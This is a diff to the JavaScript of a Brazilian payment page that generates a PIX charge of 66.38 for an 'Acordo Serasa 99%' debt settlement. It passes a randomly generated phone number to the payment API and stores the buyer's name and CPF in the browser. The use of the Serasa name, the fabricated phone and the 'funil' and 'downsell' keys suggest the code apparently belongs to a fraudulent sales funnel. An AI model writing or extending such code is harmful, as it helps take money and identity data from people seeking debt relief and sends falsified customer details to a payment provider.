@@ -114,12 +114,13 @@ document.getElementById('btn-pix').onclick=async function(){
   btn.disabled=true;btn.textContent='Gerando PIX...';
   try{
     var identifier=localStorage.getItem('funil_session')||('DES_'+Date.now());
+    var phone=randPhone();
     var body={
       identifier:identifier,
       amount:66.38,
       productType:'acordo',
       productName:'Acordo Serasa 99%',
-      client:{name:full,document:digits,phone:randPhone()},
+      client:{name:full,document:digits,phone:phone},
       tracking:(window.__getTracking?window.__getTracking():{})
     };
     var r=await fetch('../api_proxy.php?action=create_pix',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
@@ -135,7 +136,11 @@ document.getElementById('btn-pix').onclick=async function(){
       image:(j.pix&&j.pix.image),
       base64:(j.pix&&j.pix.base64),
       productType:'acordo',
-      isDownsell:false
+      isDownsell:false,
+      nome:full,
+      cpf:digits,
+      telefone:phone,
+      email:''
     }));
     localStorage.setItem('funil_nome',full);
     localStorage.setItem('funil_cpf',digits);
